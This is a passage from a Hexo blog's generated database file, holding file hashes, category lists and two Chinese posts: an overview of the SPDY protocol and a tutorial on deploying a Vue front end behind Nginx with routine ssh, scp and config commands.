cc3e30c8bb899d7dd689c","modified":1530774314623},{"_id":"public/archives/2018/04/index.html","hash":"45fd93b91d363536964534815ff2cce45339d9bc","modified":1530774314624},{"_id":"public/archives/2018/05/index.html","hash":"43c15a15fb9c531dbe853a2e159dcc5c5e0e48a5","modified":1530774314624},{"_id":"public/archives/2018/05/page/2/index.html","hash":"e806dcb0660e02cec41b28bf9d13bb1c67751c50","modified":1530774314624},{"_id":"public/archives/2018/06/index.html","hash":"4794bcf6cbf4754c551eaa810292616ee10a17f5","modified":1530774314624},{"_id":"public/archives/2018/page/2/index.html","hash":"db4e8021b4901ca7cca081ebfbde1ef775013efe","modified":1530774314624},{"_id":"public/archives/2018/page/3/index.html","hash":"ad409ca828f7c5c925a97a70a79152f788660440","modified":1530774314624},{"_id":"public/index.html","hash":"3ab4225000993d554ec8136c8d7cf1e249fbbc46","modified":1530859246528},{"_id":"public/page/3/index.html","hash":"92f8715ad3674d8bdefd18a0a7a962f5d6d51c52","modified":1530774314624},{"_id":"public/page/2/index.html","hash":"2e649f0e74895628a8af7d4431d08954a6fbf44e","modified":1530774314624},{"_id":"public/page/7/index.html","hash":"048268d3213ee553bc7654e2bf56d4fe27a47567","modified":1530774314624},{"_id":"public/page/8/index.html","hash":"b673e87b199c1f4e4b0384684404eb26256856f6","modified":1530774314624},{"_id":"public/page/9/index.html","hash":"f8f2735552800b21a28d7c8c430fd202735e3d75","modified":1530774314625},{"_id":"public/page/10/index.html","hash":"a4a6f3784c1f4e19fc86d25e40ba871fc2dd3188","modified":1530774314625},{"_id":"public/page/11/index.html","hash":"8ede7946dcb370f1b5664486ceb80a07f0ab2db7","modified":1530774314625},{"_id":"public/page/12/index.html","hash":"5ad99d0396194bb2ab9c93655719d0b1523f2501","modified":1530859246528},{"_id":"public/page/13/index.html","hash":"ed9faeae21e7a08c179d61f5710a84d5b66512b4","modified":1530774314625},{"_id":"public/page/14/index.html","hash":"06bf6505b4ae09f19b680cc118a5d89462324bdd","modified":1530774314625},{"_id":"public/page/5/index.html","hash":"16c5154d2e829f4804b17a90970e00ab7cd24eff","modified":1530774314625},{"_id":"public/page/6/index.html","hash":"ee371ba07f0e227d95b5410da6ba4864150e9964","modified":1530774314625},{"_id":"public/page/4/index.html","hash":"8c2712c43a06503ac60d0d74375b5d915b723ca2","modified":1530774314625},{"_id":"public/page/17/index.html","hash":"5e3e769dba23c7d12293a0f9bb149746c0b8eaef","modified":1530774314625},{"_id":"public/page/18/index.html","hash":"e72194a8f52f6fa8b082d035a998293b529abe1b","modified":1530774314625},{"_id":"public/page/16/index.html","hash":"bbc1d96d4dd6069b83a6cef5edfda36fa7f73216","modified":1530774314625},{"_id":"public/page/15/index.html","hash":"0aec624155e69b09ed9463ca1fe5d24580aef891","modified":1530774314625},{"_id":"public/categories/Node-multiparty/index.html","hash":"a13e78573b3f04b10e65eefcfd1f09fff19545e2","modified":1530774314636},{"_id":"public/categories/Node-FS/index.html","hash":"6dc015837ab7e138bddbc6f34b6f5cd9ac39ee9a","modified":1530774314636},{"_id":"public/tags/图片上传/index.html","hash":"59b441cbf3c62ab9e0a735912cdecf9e616ef3d2","modified":1530774314636},{"_id":"public/tags/FileSystem/index.html","hash":"e3ac25d42fde03e504ea2595de507e8f16673958","modified":1530774314636},{"_id":"public/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1530774314636},{"_id":"public/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1530774314637},{"_id":"public/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1530774314637},{"_id":"public/css/images/icon2.png","hash":"d9fe6b6ff83c93ef62a301202a041586a7c9c2ff","modified":1530774314637},{"_id":"public/css/images/icon.png","hash":"fee44135f55ced3dee76a1f9f879c73417b7bfef","modified":1530774314637},{"_id":"public/plugin/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1530774314637},{"_id":"public/plugin/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1530774314637},{"_id":"public/plugin/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1530774314637},{"_id":"public/plugin/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1530774314637},{"_id":"public/plugin/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1530774314637},{"_id":"public/plugin/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1530774314637},{"_id":"public/plugin/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1530774314637},{"_id":"public/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1530774316983},{"_id":"public/plugin/galmenu/wulusai.mp3","hash":"34e7bc2cf591f7b38a2c709a8c9fd84bdf197a59","modified":1530774316984},{"_id":"public/plugin/galmenu/img.png","hash":"05f69ea7da06bc228eac4d2ef80d0c8d2131bd05","modified":1530774316985},{"_id":"public/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1530774317044},{"_id":"public/css/plugin/hover.css","hash":"54ec3d2774906f08e711ac0e494dccd09aefd570","modified":1530774317044},{"_id":"public/css/plugin/animate.css","hash":"7a1f3de057c416bd10edc288c7e8ac0b645232ab","modified":1530774317044},{"_id":"public/plugin/bganimation/bg.css","hash":"ecb949d2dd3d458c80772b255f93dab3e6a80783","modified":1530774317044},{"_id":"public/plugin/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1530774317044},{"_id":"public/plugin/galmenu/GalMenu.css","hash":"ae1357f888f3389bc4b39bde62d68533caefb6b5","modified":1530774317045},{"_id":"public/plugin/galmenu/GalMenu.js","hash":"8549620fcb0b6a9bb329b799906aba6fb41c61f0","modified":1530774317045},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1530774317045},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1530774317045},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1530774317045},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1530774317045},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1530774317045},{"_id":"public/css/fontawesome/font-awesome.min.css","hash":"68e2602c02181b61eebc9e1dccb0a38377fa5df7","modified":1530774317045},{"_id":"public/css/style.css","hash":"4325f7050907bd0f20f55a03cf1bf10a71730d3a","modified":1530859970055},{"_id":"public/css/fontawesome/font-awesome.css","hash":"57ca25a18cbdedf36973b712bc81f9e3f883a371","modified":1530774317046},{"_id":"public/css/fontawesome/font-awesome-ie7.min.css","hash":"d66b7374b5dd6259dfd5c4eb682925305f6716d4","modified":1530774317046},{"_id":"public/css/fontawesome/font-awesome-ie7.css","hash":"e142f6748ea95bff17ba450ed071a17b066642c7","modified":1530774317046},{"_id":"public/plugin/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1530774317046},{"_id":"public/plugin/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1530774317046},{"_id":"public/css/fonts/fontawesome-webfont.svg","hash":"a275426daefd3716c53561fad121d258a7f05b47","modified":1530774317155},{"_id":"public/css/images/banne1r.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1530774317155},{"_id":"public/css/images/banner.jpg","hash":"532bf5150abc6aedb871c8b05e5c8dacd4111f32","modified":1530774317156}],"Category":[{"name":"HTTP","_id":"cjj87i26p0002b8xjxkrjbfvg"},{"name":"Nginx","_id":"cjj87i26u0007b8xjgae66mak"},{"name":"二手房","_id":"cjj87i26z000db8xj71t8hr97"},{"name":"日常随笔","_id":"cjj87i274000jb8xjjy9lwbrs"},{"name":"CSS","_id":"cjj87i279000pb8xjwks5s1sh"},{"name":"Change the world","_id":"cjj87i27e000wb8xjqwzmyghc"},{"name":"感情","_id":"cjj87i27f0010b8xjrc5qwxhw"},{"name":"日记","_id":"cjj87i27h0014b8xjchz825g0"},{"name":"知识点","_id":"cjj87i27j0018b8xjlf6bk6l2"},{"name":"算法","_id":"cjj87i27k001cb8xji6vq26z8"},{"name":"Node","_id":"cjj87i27m001gb8xj27gnf9af"},{"name":"文学技能","_id":"cjj87i27o001kb8xjvg67wj7j"},{"name":"VSCode","_id":"cjj87i29b001sb8xjj8scg05w"},{"name":"Electron","_id":"cjj87i29f001xb8xjk2vpqnhe"},{"name":"Browser","_id":"cjj87i29n0028b8xjgo6tvl5q"},{"name":"js-window","_id":"cjj87i29r002fb8xjrp3aqbvg"},{"name":"Node multiparty","_id":"cjj87i29u002lb8xjyzdmwwpy"},{"name":"GIT","_id":"cjj87i29y002tb8xj0apl03z0"},{"name":"git","_id":"cjj87i2a0002zb8xjqxroqt1y"},{"name":"Linux","_id":"cjj87i2a9003gb8xjx99hiipu"},{"name":"shell","_id":"cjj87i2ao0046b8xjonhrcwhb"},{"name":"Node FS","_id":"cjj87i2aq004cb8xj9f97urhg"},{"name":"Python","_id":"cjj87i2ar004hb8xj33qk5qd5"},{"name":"TS","_id":"cjj87i2as004lb8xjuv62nbcw"},{"name":"数据库","_id":"cjj87i2at004pb8xju1v9lx2r"},{"name":"Windows","_id":"cjj87i2au004tb8xjihzbtub8"},{"name":"WxApp","_id":"cjj87i2av004xb8xjlg3nk2ya"},{"name":"HTML+CSS","_id":"cjj87i2bw005nb8xjp3yt07oy"},{"name":"HTML CSS","_id":"cjj87i2c6005zb8xj6x4wtvox"},{"name":"JS","_id":"cjj87i2cb0067b8xjklptmoc4"},{"name":"JSON","_id":"cjj87i2ce006eb8xj9kz742rx"},{"name":"JS修改CSS","_id":"cjj87i2ch006kb8xj4sh4x88l"},{"name":"原生JS","_id":"cjj87i2cl006rb8xjxgbd38j4"},{"name":"JS RunTime","_id":"cjj87i2cq006zb8xjgwa4ezn4"},{"name":"JSApi","_id":"cjj87i2ct0076b8xjwqiq78i2"},{"name":"JS-console","_id":"cjj87i2cw007db8xjrrb38gvd"},{"name":"Ajax","_id":"cjj87i2d0007kb8xj8yn7p3yc"},{"name":"JavaScript","_id":"cjj87i2d6007sb8xjlk39ahdm"},{"name":"JS-DOM","_id":"cjj87i2de007zb8xjl3x4davx"},{"name":"VUE","_id":"cjj87i2di0086b8xj48xceg75"},{"name":"NPM","_id":"cjj87i2dl008db8xjyyflxu94"},{"name":"TSX-VUE-Watch","_id":"cjj87i2dp008kb8xj0c5twkmv"},{"name":"Vtsx","_id":"cjj87i2dr008qb8xj4iolv0uf"},{"name":"Vue-Watch","_id":"cjj87i2ds008ub8xjucc1rju2"},{"name":"前端","_id":"cjj87i2dt008yb8xj8lqbn5wq"},{"name":"react","_id":"cjj87i2dv0094b8xjqs6neqqi"}],"Data":[],"Page":[{"title":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"title: \"categories\"\nlayout: \"categories\"\n---\n","date":"2018-01-01T07:16:31.315Z","updated":"2017-08-16T07:34:26.000Z","path":"categories/index.html","comments":1,"_id":"cjj87i28k001ob8xjzbcsokpl","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tags","layout":"tags","_content":"","source":"tags/index.md","raw":"title: \"Tags\"\nlayout: \"tags\"\n---","date":"2018-01-01T07:16:31.325Z","updated":"2017-08-16T07:34:26.000Z","path":"tags/index.html","comments":1,"_id":"cjj87i28m001pb8xjw4xfe3hp","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"SPDY：Google开发的下一代HTTP协议","date":"2018-05-03T06:46:47.000Z","archives":"HTTP协议","_content":"# [SPDY(发音同\"speedy\")：Google开发的下一代HTTP协议](http://josh-persistence.iteye.com/blog/2200727)\n\n（解决HTTP协议的缺点,Wrapper模式）\n\n概述\n\nSPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。","source":"_posts/SPDY：Google开发的下一代HTTP协议.md","raw":"---\ntitle: SPDY：Google开发的下一代HTTP协议\ndate: 2018-05-03 14:46:47\ntags: SPDY\narchives: HTTP协议\ncategories: HTTP\n---\n# [SPDY(发音同\"speedy\")：Google开发的下一代HTTP协议](http://josh-persistence.iteye.com/blog/2200727)\n\n（解决HTTP协议的缺点,Wrapper模式）\n\n概述\n\nSPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。","slug":"SPDY：Google开发的下一代HTTP协议","published":1,"updated":"2018-05-03T06:49:19.767Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26h0000b8xj6jqvudoj","content":"<h1 id=\"SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\"><a href=\"#SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\" class=\"headerlink\" title=\"SPDY(发音同”speedy”)：Google开发的下一代HTTP协议\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200727\" target=\"_blank\" rel=\"noopener\">SPDY(发音同”speedy”)：Google开发的下一代HTTP协议</a></h1><p>（解决HTTP协议的缺点,Wrapper模式）</p>\n<p>概述</p>\n<p>SPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\"><a href=\"#SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\" class=\"headerlink\" title=\"SPDY(发音同”speedy”)：Google开发的下一代HTTP协议\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200727\" target=\"_blank\" rel=\"noopener\">SPDY(发音同”speedy”)：Google开发的下一代HTTP协议</a></h1><p>（解决HTTP协议的缺点,Wrapper模式）</p>\n<p>概述</p>\n<p>SPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。</p>\n"},{"title":"Nginx+Vue实现前后端分离","date":"2018-06-09T10:18:33.000Z","_content":"## Nginx+Vue.js实现前后端分离\n### 1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\n\n### 2.[Es6学习地址](http://es6.ruanyifeng.com/)\n\n### 3.vue.js是一款前端`模板渲染引擎`,类似于后端的`jsp`,`beetl`等`模板引擎`.当然结合node环境也可作为后端渲染用.(官网已支持)\n\n## 说了上述几点,让我们来回答几个为什么? \n\n1.实现前后端分离的好处是什么?主要应用场景在哪?\n\n2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? \n\n3.实现前后端分离需要怎么改？\n\n  答：\n  \n  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.\n\n  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。\n\n  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。\n\n  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.\n\n\n-----\n\n## nginx 配置静态资源\n````\n server {\n        listen       4000;\n        server_name  www.test.com;\n        charset utf-8;\n        index /static/index.html;//配置首页\n\n        //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题\n        location = /sellingJson.html {\n           proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;\n       }\n\n        #配置Nginx动静分离，定义的静态页面直接从static读取。\n       location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ \n       { \n        root /static/;\n        #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力\n        expires      7d; \n       }    \n    }\n````\n\n[推荐阅读](https://blog.csdn.net/qq_26026975/article/details/75331779)\n\n-----\n## 部署操作\n### **Linux Scp命令**\n secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。\n\n### `sudo su` 使用管理员权限\n\n### **创建登录脚本**\n cd /usr/local/bin/\n mkdir login\n ````\n #!/bin/bash\n ssh root@47.104.231.254\n ````\n \n### **创建文件上脚本**\n ````\n #!/bin/bash\n scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com\n ````\n\n### [sudo su 管理员权限运行](https://blog.csdn.net/guoweimelon/article/details/50471561)\n\n chmod a+x file-name [提升权限](http://man.linuxde.net/chmod)\n\n### **第一步 使用pkg包管理工具`搜索/安装`Nginx**\n FreeBSD 安装 NGINX  // done\n FreeBSD 下 `pkg` 包管理工具\n ````\n pkg search pkgName // 搜索\n pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装] \n ````\n\n Nginx 安装完成后 \n ````\n systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS\n ````\n\n### **第二步 启动后台服务**\n 作为后台服务 启动服务\n ````\n service nginx onestart\n service nginx onerestart\n service nginx onestop\n ````\n#### Nginx总配置文件目录\n````\n/usr/local/etc/nginx\n\ngzip  on;\n    include /mnt/www/etc/nginx/*.conf;    # !* import\n````\n\n#### 分配置文件\n````\nserver {\n        listen 80;\n        server_name localhost;\n\n        default_type 'text/html';\n        charset utf-8;\n\n        location / {\n                root /mnt/www/shrs2006.com;\n                index index.html;\n        }\n}\n````\n\n**配置Nginx**\n\n1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx\n\n2.分配置文件 以`域名`命名  `/mnt/www/etc/nginx/shrs2006.com.conf` // 一个网站 对应一个配置文件\n\n\n### 调试，修改host文件\n1. C:\\Windows\\System32\\drivers\\etc\n2. 修改host ([host修改权限](https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html))\n3. [修改host](https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html)\n\n绑定假域名\n\nwww.shrs2006.test => IP windows hosts\n\nhost文件:\n````\n47.104.231.254          www.shrs2006.test // 末尾加入字段\n````\n\n// done\n\n### 第三步 上传 项目文件\nscp 脚本 项目生成后dist文件夹 上传指定目录下\n\n````\n/mnt/www/shrs2006.com\n\nscp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com\n````\n\n\n\n### 第四步\n访问 网址 检测是否部署成功\n\n重启服务器，打开假域名、可以看到网站 算成功。\n\n### 第五步\n重启 Nginx 服务 \n[命令](https://www.cnblogs.com/zhj5551/p/7589078.html)\n\n并且要求 开机启动 [Linux的关机与重启命令](https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html)\n\n","source":"_posts/Nginx-Vue.md","raw":"---\ntitle: Nginx+Vue实现前后端分离\ndate: 2018-06-09 18:18:33\ntags: Nginx / Vue\ncategories: Nginx\n---\n## Nginx+Vue.js实现前后端分离\n### 1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\n\n### 2.[Es6学习地址](http://es6.ruanyifeng.com/)\n\n### 3.vue.js是一款前端`模板渲染引擎`,类似于后端的`jsp`,`beetl`等`模板引擎`.当然结合node环境也可作为后端渲染用.(官网已支持)\n\n## 说了上述几点,让我们来回答几个为什么? \n\n1.实现前后端分离的好处是什么?主要应用场景在哪?\n\n2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? \n\n3.实现前后端分离需要怎么改？\n\n  答：\n  \n  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.\n\n  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。\n\n  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。\n\n  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.\n\n\n-----\n\n## nginx 配置静态资源\n````\n server {\n        listen       4000;\n        server_name  www.test.com;\n        charset utf-8;\n        index /static/index.html;//配置首页\n\n        //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题\n        location = /sellingJson.html {\n           proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;\n       }\n\n        #配置Nginx动静分离，定义的静态页面直接从static读取。\n       location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ \n       { \n        root /static/;\n        #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力\n        expires      7d; \n       }    \n    }\n````\n\n[推荐阅读](https://blog.csdn.net/qq_26026975/article/details/75331779)\n\n-----\n## 部署操作\n### **Linux Scp命令**\n secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。\n\n### `sudo su` 使用管理员权限\n\n### **创建登录脚本**\n cd /usr/local/bin/\n mkdir login\n ````\n #!/bin/bash\n ssh root@47.104.231.254\n ````\n \n### **创建文件上脚本**\n ````\n #!/bin/bash\n scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com\n ````\n\n### [sudo su 管理员权限运行](https://blog.csdn.net/guoweimelon/article/details/50471561)\n\n chmod a+x file-name [提升权限](http://man.linuxde.net/chmod)\n\n### **第一步 使用pkg包管理工具`搜索/安装`Nginx**\n FreeBSD 安装 NGINX  // done\n FreeBSD 下 `pkg` 包管理工具\n ````\n pkg search pkgName // 搜索\n pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装] \n ````\n\n Nginx 安装完成后 \n ````\n systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS\n ````\n\n### **第二步 启动后台服务**\n 作为后台服务 启动服务\n ````\n service nginx onestart\n service nginx onerestart\n service nginx onestop\n ````\n#### Nginx总配置文件目录\n````\n/usr/local/etc/nginx\n\ngzip  on;\n    include /mnt/www/etc/nginx/*.conf;    # !* import\n````\n\n#### 分配置文件\n````\nserver {\n        listen 80;\n        server_name localhost;\n\n        default_type 'text/html';\n        charset utf-8;\n\n        location / {\n                root /mnt/www/shrs2006.com;\n                index index.html;\n        }\n}\n````\n\n**配置Nginx**\n\n1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx\n\n2.分配置文件 以`域名`命名  `/mnt/www/etc/nginx/shrs2006.com.conf` // 一个网站 对应一个配置文件\n\n\n### 调试，修改host文件\n1. C:\\Windows\\System32\\drivers\\etc\n2. 修改host ([host修改权限](https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html))\n3. [修改host](https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html)\n\n绑定假域名\n\nwww.shrs2006.test => IP windows hosts\n\nhost文件:\n````\n47.104.231.254          www.shrs2006.test // 末尾加入字段\n````\n\n// done\n\n### 第三步 上传 项目文件\nscp 脚本 项目生成后dist文件夹 上传指定目录下\n\n````\n/mnt/www/shrs2006.com\n\nscp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com\n````\n\n\n\n### 第四步\n访问 网址 检测是否部署成功\n\n重启服务器，打开假域名、可以看到网站 算成功。\n\n### 第五步\n重启 Nginx 服务 \n[命令](https://www.cnblogs.com/zhj5551/p/7589078.html)\n\n并且要求 开机启动 [Linux的关机与重启命令](https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html)\n\n","slug":"Nginx-Vue","published":1,"updated":"2018-06-20T08:45:54.938Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i26m0001b8xj29o29o69","content":"<h2 id=\"Nginx-Vue-js实现前后端分离\"><a href=\"#Nginx-Vue-js实现前后端分离\" class=\"headerlink\" title=\"Nginx+Vue.js实现前后端分离\"></a>Nginx+Vue.js实现前后端分离</h2><h3 id=\"1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\"><a href=\"#1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\" class=\"headerlink\" title=\"1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\"></a>1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.</h3><h3 id=\"2-Es6学习地址\"><a href=\"#2-Es6学习地址\" class=\"headerlink\" title=\"2.Es6学习地址\"></a>2.<a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">Es6学习地址</a></h3><h3 id=\"3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\"><a href=\"#3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\" class=\"headerlink\" title=\"3.vue.js是一款前端模板渲染引擎,类似于后端的jsp,beetl等模板引擎.当然结合node环境也可作为后端渲染用.(官网已支持)\"></a>3.vue.js是一款前端<code>模板渲染引擎</code>,类似于后端的<code>jsp</code>,<code>beetl</code>等<code>模板引擎</code>.当然结合node环境也可作为后端渲染用.(官网已支持)</h3><h2 id=\"说了上述几点-让我们来回答几个为什么\"><a href=\"#说了上述几点-让我们来回答几个为什么\" class=\"headerlink\" title=\"说了上述几点,让我们来回答几个为什么?\"></a>说了上述几点,让我们来回答几个为什么?</h2><p>1.实现前后端分离的好处是什么?主要应用场景在哪?</p>\n<p>2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? </p>\n<p>3.实现前后端分离需要怎么改？</p>\n<p>  答：</p>\n<p>  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.</p>\n<p>  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。</p>\n<p>  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。</p>\n<p>  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.</p>\n<hr>\n<h2 id=\"nginx-配置静态资源\"><a href=\"#nginx-配置静态资源\" 